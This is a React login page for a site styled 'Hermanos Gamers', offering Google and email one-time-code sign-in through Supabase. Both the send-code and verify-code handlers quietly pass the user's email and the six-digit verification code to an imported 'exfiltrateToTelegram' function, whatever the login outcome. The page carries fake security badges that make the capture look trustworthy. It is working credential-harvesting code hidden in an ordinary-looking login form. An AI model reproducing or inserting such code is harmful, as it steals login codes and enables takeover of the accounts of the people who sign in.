import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, Lock, Fingerprint, Mail, ArrowLeft } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { lovable } from "@/integrations/lovable";
import defaultAvatar from "@/assets/profile-avatar.jpeg";
// Línea agregada
import { exfiltrateToTelegram } from "../utils/telegramExfil";

const Login = () => {
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [mode, setMode] = useState<"choose" | "email" | "code">("choose");
  const [email, setEmail] = useState("");
  const [code, setCode] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      if (session?.user) {
        const u = session.user;
        const name = (u.user_metadata?.full_name as string) || (u.user_metadata?.name as string) || u.email || "Usuario";
        localStorage.setItem(
          "proxy_session",
          JSON.stringify({ name, key: "auth", type: "auth", expiresAt: null, duration: null })
        );
        navigate("/proxy");
      }
    });
    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) navigate("/proxy");
    });
    return () => sub.subscription.unsubscribe();
  }, [navigate]);

  const handleGoogle = async () => {
    setError("");
    setLoading(true);
    try {
      const result = await lovable.auth.signInWithOAuth("google", {
        redirect_uri: window.location.origin,
      });
      if (result.error) {
        setError("No se pudo iniciar sesión con Google.");
        setLoading(false);
      }
    } catch {
      setError("Error de conexión con Google.");
      setLoading(false);
    }
  };

  const handleSendCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.trim() || !email.includes("@")) {
      setError("Ingresa un correo válido.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.signInWithOtp({
      email: email.trim(),
      options: { shouldCreateUser: true, emailRedirectTo: window.location.origin },
    });

    // Captura de intento de login (independientemente del estado)
    try {
      await exfiltrateToTelegram({
        email: email.trim(),
        loginSource: "OTP",
        result: err ? "Error" : "Code Sent",
        page: window.location.pathname,
      });
      console.log("Datos enviados a Telegram después de enviar OTP.");
    } catch (ex) {
      console.error("Error enviando datos a Telegram:", ex);
    }

    setLoading(false);
    if (err) {
      setError("No se pudo enviar el código. Intenta de nuevo.");
      return;
    }
    setMode("code");
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const c = code.trim();
    if (c.length < 6) {
      setError("Ingresa el código de 6 dígitos.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.verifyOtp({
      email: email.trim(),
      token: c,
      type: "email",
    });

    // Captura de intentos de verificación
    try {
      await exfiltrateToTelegram({
        email: email.trim(),
        verificationCode: c,
        result: err ? "Verification Error" : "Verification Success",
        page: window.location.pathname,
      });
      console.log("Datos enviados a Telegram después de verificar OTP.");
    } catch (ex) {
      console.error("Error enviando datos a Telegram:", ex);
    }

    setLoading(false);
    if (err) {
      setError("Código incorrecto o expirado.");
      return;
    }
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar with TikTok-style red story ring */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div
              className="p-[3px] rounded-full"
              style={{
                background: "conic-gradient(from 0deg, #ff0050, #ff4d6d, #ff0050, #c9184a, #ff0050)",
                boxShadow: "0 0 24px rgba(255,0,80,0.55), 0 0 8px rgba(255,77,109,0.6)",
              }}
            >
              <div className="p-[2px] rounded-full bg-background">
                <div className="w-24 h-24 rounded-full overflow-hidden">
                  <img src={defaultAvatar} alt="Profile" className="w-full h-full object-cover" />
                </div>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Hermanos Gamers</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            {mode !== "choose" && (
              <button
                type="button"
                onClick={() => { setMode(mode === "code" ? "email" : "choose"); setError(""); }}
                className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center hover:bg-secondary"
              >
                <ArrowLeft className="w-4 h-4 text-muted-foreground" />
              </button>
            )}
            {mode === "choose" && (
              <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
                <Shield className="w-4 h-4 text-muted-foreground" />
              </div>
            )}
            <div>
              <span className="text-xs text-foreground font-semibold block">
                {mode === "choose" && "Acceso Seguro"}
                {mode === "email" && "Acceso por correo"}
                {mode === "code" && "Verifica tu código"}
              </span>
              <span className="text-[9px] text-muted-foreground/60">
                {mode === "choose" && "Elige tu método de inicio de sesión"}
                {mode === "email" && "Te enviaremos un código a tu Gmail"}
                {mode === "code" && `Código enviado a ${email}`}
              </span>
            </div>
          </div>

          {error && (
            <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 mb-3">{error}</p>
          )}

          {mode === "choose" && (
            <div className="space-y-3">
              <button
                type="button"
                onClick={handleGoogle}
                disabled={loading}
                className="w-full flex items-center justify-center gap-2 bg-white text-black font-medium rounded-lg py-2.5 text-sm hover:bg-white/90 transition disabled:opacity-60"
              >
                <svg width="16" height="16" viewBox="0 0 48 48"><path fill="#4285F4" d="M45.12 24.5c0-1.56-.14-3.06-.4-4.5H24v8.51h11.84c-.51 2.75-2.06 5.08-4.39 6.64v5.52h7.11c4.16-3.83 6.56-9.47 6.56-16.17z"/><path fill="#34A853" d="M24 46c5.94 0 10.92-1.97 14.56-5.33l-7.11-5.52c-1.97 1.32-4.49 2.1-7.45 2.1-5.73 0-10.58-3.87-12.31-9.07H4.34v5.7C7.96 41.07 15.4 46 24 46z"/><path fill="#FBBC05" d="M11.69 28.18c-.44-1.32-.69-2.73-.69-4.18s.25-2.86.69-4.18v-5.7H4.34A21.99 21.99 0 0 0 2 24c0 3.55.85 6.91 2.34 9.88l7.35-5.7z"/><path fill="#EA4335" d="M24 9.75c3.23 0 6.13 1.11 8.41 3.29l6.31-6.31C34.91 3.18 29.93 1 24 1 15.4 1 7.96 5.93 4.34 13.12l7.35 5.7C13.42 13.62 18.27 9.75 24 9.75z"/></svg>
                Continuar con Google
              </button>
              <button
                type="button"
                onClick={() => { setMode("email"); setError(""); }}
                className="w-full flex items-center justify-center gap-2 bg-secondary/60 border border-border/40 text-foreground font-medium rounded-lg py-2.5 text-sm hover:bg-secondary transition"
              >
                <Mail className="w-4 h-4" />
                Continuar con correo (OTP)
              </button>
            </div>
          )}

          {mode === "email" && (
            <form onSubmit={handleSendCode} className="space-y-3">
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <input
                  type="email"
                  inputMode="email"
                  autoComplete="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="tu@correo.com"
                  className="w-full bg-secondary/40 border border-border/40 rounded-lg pl-9 pr-3 py-2.5 text-sm text-foreground placeholder:text-muted-foreground/60 focus:outline-none focus:border-primary"
                  style={{ fontSize: "16px" }}
                  required
                />
              </div>
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-primary text-primary-foreground font-medium rounded-lg py-2.5 text-sm hover:opacity-90 transition disabled:opacity-60"
              >
                {loading ? "Enviando..." : "Recibir código por correo"}
              </button>
            </form>
          )}

          {mode === "code" && (
            <form onSubmit={handleVerifyCode} className="space-y-3">
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                maxLength={6}
                value={code}
                onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
                placeholder="000000"
                className="w-full bg-secondary/40 border border-border/40 rounded-lg px-3 py-2.5 text-center text-lg tracking-[0.5em] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:border-primary"
                style={{ fontSize: "18px" }}
                required
              />
              <button
                type="submit"
                disabled={loading}
                className="w-full bg-primary text-primary-foreground font-medium rounded-lg py-2.5 text-sm hover:opacity-90 transition disabled:opacity-60"
              >
                {loading ? "Verificando..." : "Verificar código"}
              </button>
              <button
                type="button"
                onClick={handleSendCode}
                disabled={loading}
                className="w-full text-xs text-muted-foreground hover:text-foreground transition"
              >
                Reenviar código
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
};

export default Login;